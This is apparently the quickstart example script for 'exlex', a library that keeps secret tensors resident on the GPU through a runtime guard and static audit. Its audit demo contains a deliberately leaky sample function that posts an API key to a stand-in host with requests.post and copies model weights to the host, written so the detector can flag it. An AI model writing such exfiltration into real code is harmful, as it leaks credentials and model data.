"""Runnable tour of the exlex API. No GPU and no torch required.

    python examples/quickstart.py
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import exlex  # noqa: E402
from exlex.levels import Level  # noqa: E402


class FakeTensor:
    """Stands in for a CUDA tensor so the tour runs anywhere."""

    def __init__(self, value: float, is_cuda: bool = True) -> None:
        self.value = value
        self.is_cuda = is_cuda

    def cpu(self) -> "FakeTensor":
        print("    (a host copy happened here)")
        return FakeTensor(self.value, is_cuda=False)

    def item(self) -> float:
        return self.value

    def to(self, device: str) -> "FakeTensor":
        return FakeTensor(self.value, is_cuda=not device.startswith("cpu"))

    def mul(self, other: float) -> "FakeTensor":
        return FakeTensor(self.value * other, is_cuda=self.is_cuda)

    def __repr__(self) -> str:
        return f"FakeTensor({self.value}, is_cuda={self.is_cuda})"


def demo_levels() -> None:
    print("=" * 72)
    print("1. What each level claims, and what it does not")
    print("=" * 72)
    for level in (Level.HARDENED, Level.RESIDENT, Level.ATTESTED):
        spec = exlex.spec(level)
        print(f"\n{spec.name.upper()} (level {level.value})")
        print(f"  stops: {len(spec.prevents)} classes of attack")
        print("  a determined attacker still can:")
        for item in spec.residual[:3]:
            print(f"    - {item}")
        if len(spec.residual) > 3:
            print(f"    - ... and {len(spec.residual) - 3} more")


def demo_residency() -> None:
    print()
    print("=" * 72)
    print("2. The residency guard blocks a host copy at runtime")
    print("=" * 72)
    import types

    fake = types.ModuleType("fake")
    fake.Tensor = FakeTensor

    guard = exlex.ResidencyGuard(torch_module=fake)
    exlex.set_guard(guard)
    guard.install()
    try:

        @exlex.secret
        def train_step(model, batch):
            return model.mul(2.0)

        result = train_step(FakeTensor(3.0), FakeTensor(1.0))
        print(f"  train_step returned {result} without complaint")

        # The @secret region closed when train_step returned, so a transfer now
        # is allowed. Residency is scoped, not a permanent mode.
        print("  outside the secret region, .cpu() is permitted:")
        host_copy = result.cpu()
        print(f"    {host_copy}")

        # Inside a region, the same call is refused.
        with exlex.resident():
            try:
                result.cpu()
            except exlex.ResidencyViolation as exc:
                print(f"  inside a region, .cpu() was refused: {str(exc)[:88]}...")

            with exlex.allow("aggregate loss for the dashboard"):
                print(f"  inside allow(): loss = {result.item()}")

        print(f"  allow-scopes recorded: {guard.summary()['allow_scopes']}")
    finally:
        guard.uninstall()
        exlex.set_guard(exlex.ResidencyGuard())


def demo_audit() -> None:
    print()
    print("=" * 72)
    print("3. Static analysis finds the same bug before it runs")
    print("=" * 72)
    leaky = '''
import exlex

@exlex.secret
def export(model, api_key):
    torch.save(model.state_dict(), "ckpt.pt")
    requests.post("https://example.invalid", data=api_key)
    return model.weights.cpu()
'''
    for finding in exlex.audit.audit_source(leaky, "leaky.py"):
        print(f"  {finding}")


def demo_doctor() -> None:
    print()
    print("=" * 72)
    print("4. What this host can honestly claim right now")
    print("=" * 72)
    for line in exlex.doctor().splitlines():
        print(f"  {line}")


if __name__ == "__main__":
    demo_levels()
    demo_residency()
    demo_audit()
    demo_doctor()
